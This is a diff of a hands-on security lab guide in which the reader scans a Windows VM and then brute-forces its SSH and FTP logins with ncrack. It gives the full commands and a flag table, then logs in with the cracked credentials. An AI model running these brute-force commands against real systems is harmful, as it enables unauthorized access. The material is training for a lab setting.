@@ -73,8 +73,7 @@ source ./venv/bin/activate
 > You must replace **<WINDOWS_IP>** with the actual IP of your Windows VM instance. You can find it by typing **"ipconfig"** in the **Powershell terminal of the Windows VM**. You will find your specific IP in the
 >"Ethernet adapter Ethernet" section. Take the IP and replace **<WINDOWS_IP>** with it. Note that yours will differ.
 
-
-<img width="1140" height="264" alt="image" src="https://github.com/user-attachments/assets/0c96569c-b57e-4d10-a2af-33ce513f67c6" />
+<img width="877" height="269" alt="image" src="https://github.com/user-attachments/assets/ea1200e9-9de1-425b-8803-3a6cefd219c3" />
 
 - Open up Leviathan in the **Ubuntu shell** using sudo: 
 
@@ -95,12 +94,11 @@ sudo ../venv/bin/python3 -W ignore leviathan.py
 3. When prompted, enter your `<WINDOWS_IP>`.
 4. Select the protocols : We'll start with ssh
 
-<img width="675" height="513" alt="image" src="https://github.com/user-attachments/assets/59cb958b-9578-4e82-91a4-e718e57c2cb2" />
+<img width="601" height="492" alt="image" src="https://github.com/user-attachments/assets/2050cb0e-3199-44b6-927c-52396a7cfecd" />
 
 5. Wait for the scan to finish. Note the path of the save file. Type **"CTRL+C"** to exit the menu. Let's read the results:
 
-<img width="921" height="455" alt="image" src="https://github.com/user-attachments/assets/5ca90787-b56a-45d9-b49f-d913dfb5f99c" />
-<img width="931" height="98" alt="image" src="https://github.com/user-attachments/assets/b13896a3-e772-4373-88e6-9add9c2749fa" />
+<img width="921" height="511" alt="image" src="https://github.com/user-attachments/assets/56ea926b-b9b7-46ad-b8db-ec64571724f0" />
 
 >[!NOTE]
 > **What happened ? Why is only the Windows VM IP in the file ?**
@@ -116,7 +114,9 @@ sudo ../venv/bin/python3 -W ignore leviathan.py
 2. Navigate the interface, in the **Discovery** section input the **<WINDOWS_IP>** and select the **FTP** service.
 3. Read the result file.
 
-<img width="925" height="732" alt="image" src="https://github.com/user-attachments/assets/d8a54bbb-966e-4b66-80ef-1d63ff9aefd7" />
+<img width="923" height="154" alt="image" src="https://github.com/user-attachments/assets/067aec1d-2af4-4ff1-b47d-cbfb1eca0662" />
+<img width="928" height="208" alt="image" src="https://github.com/user-attachments/assets/eba93f5d-3548-4384-8172-6fe4816b8332" />
+
 
 ---
 
@@ -132,37 +132,119 @@ We now know that two ports are open :
 
 Note down the discovered open ports before continuing.
 
-## Phase 2: Initial Access via Leviathan — Multi-Service Brute Force - Ubuntu VM
-
-Armed with the service map from Phase 1, we now launch a credential attack. Leviathan's **ncrack** integration will simultaneously brute-force **all discovered services** using its built-in wordlists, targeting every exposed protocol in a single pass.
-
-- Run the brute-force attack from the Leviathan framework directory:
-
+## Phase 2: Initial Access — ncrack Brute-Force (CLI Mode) - Ubuntu VM
+ 
+**Why bypass Leviathan's interface?**
+ 
+Leviathan's brute-force module was originally written in Python 2. Although the `2to3` migration handles most syntax, the internal subprocess calls that construct and invoke ncrack can silently misfire on modern Python 3 environments — producing no output, no errors, and no results. The reconnaissance module (masscan) works correctly because it is architecturally far simpler.
+ 
+Crucially, **Leviathan has already done the hard part in Phase 1**: it produced hit list files containing every reachable IP per protocol. We bypass the broken Python wrapper and pass those files directly to `ncrack`, which is already installed on the system. The intelligence is the same — only the delivery mechanism changes.
+ 
+---
+ 
+### Step 1 — Locate the Leviathan hit list files
+ 
+Leviathan saves masscan results to its `lists/` directory. Find the files produced in Phase 1:
+ 
 ```bash
-cd ~/BnB/Leviathan/leviathan_framework
-python3 -W ignore leviathan.py --target <WINDOWS_IP> --brute
+ls -lh ~/BnB/Leviathan/leviathan_framework/lists/
 ```
-
-Leviathan will work through both SSH and FTP concurrently. When finished, you should see cracked credentials for both services:
-
+ 
+You should see one file per service scan you performed. Confirm each file contains your Windows VM IP before proceeding:
+ 
+```bash
+cat ~/BnB/Leviathan/leviathan_framework/lists/<ssh_output_file>.txt
+cat ~/BnB/Leviathan/leviathan_framework/lists/<ftp_output_file>.txt
 ```
-[+] SSH   <WINDOWS_IP>:22   victim / Password123!
-[+] FTP   <WINDOWS_IP>:21   victim / Password123!
+ 
+> [!IMPORTANT]
+> Replace `<ssh_output_file>` and `<ftp_output_file>` with the exact filenames shown during Phase 1. Both files should contain a single line: your `<WINDOWS_IP>`.
+ 
+---
+ 
+### Step 2 — Locate the Leviathan wordlists
+ 
+The Leviathan framework ships with its own credential wordlists. List them so you know the exact filenames before constructing the attack command:
+ 
+```bash
+ls ~/BnB/Leviathan/leviathan_framework/wordlist/
 ```
-
->[!NOTE]
-> Both services share the same credentials — this is intentional and reflects a very common real-world misconfiguration: **credential reuse across services**. A single weak password exposed on one protocol exposes every other protocol that account touches.
-
-We will use **SSH** for interactive access, as it gives us a full remote shell. Note that FTP would give an attacker file access without an interactive session — a useful alternative for stealth.
-
-Log into the Windows machine using the discovered SSH credentials and the exact SSH command from Phase 0:
-
+ 
+Note the names of the files — you will substitute them in the commands below where you see `<wordlist_file>`.
+ 
+---
+ 
+### Step 3 — Brute-force SSH (port 22)
+ 
+Use `ncrack` with the `-iL` flag to point directly at Leviathan's hit list. The `-U` and `-P` flags supply the username and password wordlists bundled with the framework:
+ 
+```bash
+ncrack -p 22 \
+  -U ~/BnB/Leviathan/leviathan_framework/wordlist/<users_wordlist_file> \
+  -P ~/BnB/Leviathan/leviathan_framework/wordlist/<passwords_wordlist_file> \
+  -T 3 \
+  -iL ~/BnB/Leviathan/leviathan_framework/lists/<ssh_output_file>.txt \
+  -v
+```
+ 
+**Flag reference:**
+ 
+| Flag | Purpose |
+|------|---------|
+| `-p 22` | Target port |
+| `-U` | Username wordlist |
+| `-P` | Password wordlist |
+| `-T 3` | Timing template — `3` is balanced; lower to `2` if SSH starts rate-limiting connections |
+| `-iL` | Read target IPs from file — Leviathan's hit list drops in here directly |
+| `-v` | Verbose — print each attempt and surface discovered credentials immediately |
+ 
+When ncrack cracks the credential, the output will look like this:
+ 
+```
+Discovered credentials for ssh on <WINDOWS_IP>:22 'victim' 'Password123!'
+```
+ 
+---
+ 
+### Step 4 — Brute-force FTP (port 21)
+ 
+Repeat the same attack for FTP:
+ 
+```bash
+ncrack -p 21 \
+  -U ~/BnB/Leviathan/leviathan_framework/wordlist/<users_wordlist_file> \
+  -P ~/BnB/Leviathan/leviathan_framework/wordlist/<passwords_wordlist_file> \
+  -T 3 \
+  -iL ~/BnB/Leviathan/leviathan_framework/lists/<ftp_output_file>.txt \
+  -v
+```
+ 
+Expected output:
+ 
+```
+Discovered credentials for ftp on <WINDOWS_IP>:21 'victim' 'Password123!'
+```
+ 
+> [!NOTE]
+> Both services share the same credentials. This is a very common real-world misconfiguration known as **credential reuse**: a single weak password exposed on one protocol immediately compromises every other service that account touches. This is exactly why password managers and per-service credentials matter.
+ 
+---
+ 
+### Step 5 — Connect to the target via SSH
+ 
+We will use SSH for interactive access, as it provides a full remote shell. FTP would give file access without an interactive session — useful for stealth, but less powerful for our next phase.
+ 
+Log in using the credentials ncrack just cracked:
+ 
 ```bash
 ssh victim@<WINDOWS_IP>
 ```
-
-**CRITICAL STEP:** OpenSSH drops you into a basic Windows Command Prompt (cmd.exe) by default. Switch to PowerShell by typing:
-
+ 
+> [!IMPORTANT]
+> If the connection is refused with a domain-related error, use the **exact SSH command** that was printed at the end of Phase 0.
+ 
+**CRITICAL STEP:** OpenSSH on Windows drops you into a basic Command Prompt (`cmd.exe`) by default. Switch to PowerShell immediately by typing:
+ 
 ```dos
 powershell
 ```
